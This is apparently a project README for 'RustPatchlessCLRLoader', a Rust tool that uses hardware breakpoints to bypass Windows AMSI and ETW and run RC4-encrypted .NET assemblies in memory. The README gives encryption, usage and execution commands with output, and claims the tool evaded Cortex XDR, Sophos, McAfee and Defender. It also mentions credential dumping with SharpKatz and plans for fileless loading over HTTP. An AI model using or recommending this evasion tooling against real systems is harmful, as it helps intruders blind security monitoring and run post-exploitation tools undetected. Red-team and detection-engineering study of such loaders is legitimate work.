# RustPatchlessCLRLoader
The RustPatchlessCLRLoader leverages a sophisticated integration of patchless techniques for bypassing both Event Tracing for Windows (ETW) and the Windows Antimalware Scan Interface (AMSI) across all threads with the goal of loading .NET assemblies dynamically by utilizing the [clroxide](https://github.com/yamakadi/clroxide) Rust library. It provides a robust solution for executing managed code stealthily without modifying system artifacts or triggering security mechanisms.

## Background
Leveraging hardware breakpoints for patchless bypass presents several strategic advantages in cybersecurity assessments. This method eschews the use of well-known APIs like VirtualProtect, which are often scrutinized by advanced security solutions, thereby reducing the likelihood of detection. Additionally, the utilization of hardware breakpoints eliminates the need for direct modifications to files. Such alterations are typically flagged by file integrity monitoring systems or Endpoint Detection and Response (EDR) technologies. As a result, employing hardware breakpoints enables a more covert operation, enhancing the stealth aspect of security maneuvers. 

## Payload Encryption
RC4 Encrypt Payload: https://github.com/c2pain/RC4_Encryptor

SharpCollection: https://github.com/Flangvik/SharpCollection

Example:
```
C:\Users\C2Pain\Desktop> rc4_encryptor.exe Seatbelt.exe
[+] Encrypted shellcode saved to: S-e-a-t-b-e-l-t-4.enc
```

## Usage
```
C:\Users\C2Pain\Desktop>RustPatchlessCLRLoader.exe
[+] RustPatchlessCLRLoader by C2Pain.
[+] Github: https://github.com/c2pain/RustPatchlessCLRLoader
[!] Usage: RustPatchlessCLRLoader.exe <RC4 Encrypted File> <Arguments>
[!] Example: RustPatchlessCLRLoader.exe S-e-a-t-b-e-l-t-4.enc AntiVirus
```

## Execution
```
C:\Users\C2Pain\Desktop>RustPatchlessCLRLoader.exe S-e-a-t-b-e-l-t-4.enc AntiVirus
[+] RustPatchlessCLRLoader by C2Pain.
[+] Github: https://github.com/c2pain/RustPatchlessCLRLoader
[+] Running S-e-a-t-b-e-l-t-4.enc with args: ["AntiVirus"]
[+] NtTraceControl Bypass invoked at address: 0x7FF9618B0DE0
[+] AMSI Bypass invoked at address: 0x7FF949BE3880
[+] Results:



                        %&&@@@&&
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
                        &%%&&&%%%%%        v1.2.2         ,(((&%%%%%%%%%%%%%%%%%,
                         #%%%%##,


====== AntiVirus ======

  Engine                         : Windows Defender
  ProductEXE                     : windowsdefender://
  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe



[*] Completed collection in 0.038 seconds
```

## AV/EDR Testing Result on x64 Windows 10/11
The RustPatchlessCLRLoader has been tested with various antivirus products, such as loading the "Seatbelt" assembly without triggering any detection. It is important to note that while this loader effectively bypasses AMSI and ETW without detection, engaging in overtly malicious activities - such as using SharpKatz for password dumping, may activate behavioral detection mechanisms. 

Test Date: 2 Aug 2024
| AV/EDR Product | Execute |
| ------ | ------ |
| Palo Alto Cortex XDR | :white_check_mark: |
| Sophos Intercept X | :white_check_mark: |
| McAfee | :white_check_mark: |
| Microsoft Defender | :white_check_mark: |

## Screenshots
![Palo Alto Cortex XDR Seatbelt](/screenshots/Cortex-testing.png)
![Sophos Intercept X Seatbelt](/screenshots/Sophos-testing.png)

## ToDo
- [ ] Powershell scripts support.
- [ ] Fileless support with HTTP/HTTPS.

## Credits
@yamakadi implementation of rust library that allows to host the CLR and dynamically execute dotnet binaries. [Link](https://github.com/yamakadi/clroxide)

@BlackSnufkin implementation of PatchlessBypass AMSI and ETW in rust. [Link](https://github.com/BlackSnufkin/Rusty-Playground)
